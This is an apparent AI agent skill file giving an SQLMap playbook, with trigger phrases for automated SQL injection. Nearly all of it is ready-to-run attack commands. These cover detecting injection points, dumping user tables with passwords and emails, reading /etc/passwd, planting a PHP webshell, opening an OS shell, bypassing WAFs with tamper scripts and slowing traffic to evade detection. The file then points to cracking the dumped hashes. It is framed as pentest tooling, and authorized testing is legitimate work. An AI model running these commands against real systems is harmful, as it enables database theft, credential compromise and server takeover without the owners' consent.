---
name: tool-sqlmap
description: "SQLMap usage guide — detection mode, database enumeration, data extraction, file read/write, OS shell, WAF bypass, tamper scripts, custom payloads. Triggers: 'sqlmap', 'sql injection tool', 'sqlmap enum', 'sqlmap dump', 'sqlmap os-shell', 'sqlmap tamper', 'sqlmap waf bypass', 'sqlmap file', 'automated sql injection'."
---

# SQLMap Usage Guide

Automated SQL injection detection and exploitation with fine-grained control.

---

## Phase 1: Detection

```bash
# Basic URL scan:
sqlmap -u "https://TARGET/page?id=1" --batch --level=3 --risk=2 2>&1 | tee output/sqlmap_detect.txt

# POST data:
sqlmap -u "https://TARGET/login" --data="user=admin&pass=test" --batch 2>&1

# JSON:
sqlmap -u "https://TARGET/api/search" --data='{"id":1}' --content-type="application/json" --batch 2>&1

# Cookie injection:
sqlmap -u "https://TARGET/profile" --cookie="session=TOKEN; uid=1" -p uid --batch 2>&1

# From Burp request file:
sqlmap -r /tmp/request.txt --batch --level=5 --risk=3 2>&1

# Custom header injection:
sqlmap -u "https://TARGET/api" -H "X-User-ID: 1" -p "X-User-ID" --batch 2>&1
```

---

## Phase 2: Database Enumeration

```bash
URL="https://TARGET/page?id=1"

# List databases:
sqlmap -u "$URL" --batch --dbs 2>&1 | grep "available databases" -A20

# List tables in database:
sqlmap -u "$URL" --batch -D "target_db" --tables 2>&1

# Dump table:
sqlmap -u "$URL" --batch -D "target_db" -T "users" --dump 2>&1 | tee output/sqlmap_users.txt

# Dump all:
sqlmap -u "$URL" --batch -D "target_db" --dump-all 2>&1 | tee output/sqlmap_dump.txt

# Get specific columns:
sqlmap -u "$URL" --batch -D "target_db" -T "users" -C "username,password,email" --dump 2>&1
```

---

## Phase 3: File Access & OS Shell

```bash
URL="https://TARGET/page?id=1"

# Read file (MySQL requires FILE priv):
sqlmap -u "$URL" --batch --file-read="/etc/passwd" 2>&1
sqlmap -u "$URL" --batch --file-read="C:/Windows/win.ini" 2>&1

# Write file (webshell):
sqlmap -u "$URL" --batch \
  --file-write="/tmp/shell.php" \
  --file-dest="/var/www/html/shell.php" 2>&1

# OS shell:
sqlmap -u "$URL" --batch --os-shell 2>&1
# Interactive SQL shell:
sqlmap -u "$URL" --batch --sql-shell 2>&1
```

---

## Phase 4: WAF Bypass (Tamper Scripts)

```bash
URL="https://TARGET/page?id=1"

# Available tamper scripts:
sqlmap --list-tampers 2>/dev/null

# Common bypass combinations:
# Space bypass:
sqlmap -u "$URL" --batch --tamper="space2comment" 2>&1
# WAF bypass:
sqlmap -u "$URL" --batch --tamper="between,randomcase,space2comment" 2>&1
# Encoding bypass:
sqlmap -u "$URL" --batch --tamper="charencode,charunicodeencode" 2>&1
# Modsecurity bypass:
sqlmap -u "$URL" --batch --tamper="modsecurityversioned,modsecurityzeroversioned" 2>&1
# Random case:
sqlmap -u "$URL" --batch --tamper="randomcase,equaltolike" 2>&1

# Slow down to evade detection:
sqlmap -u "$URL" --batch --delay=2 --safe-freq=3 --safe-url="https://TARGET/" 2>&1
```

---

## Output

Save to `output/`:
- `sqlmap_detect.txt` — detection results
- `sqlmap_users.txt` — dumped user table
- `sqlmap_dump.txt` — full database dump

## Next Phase

→ `tool-hashcat-john` to crack dumped password hashes
→ `pentest-report` to document SQL injection findings
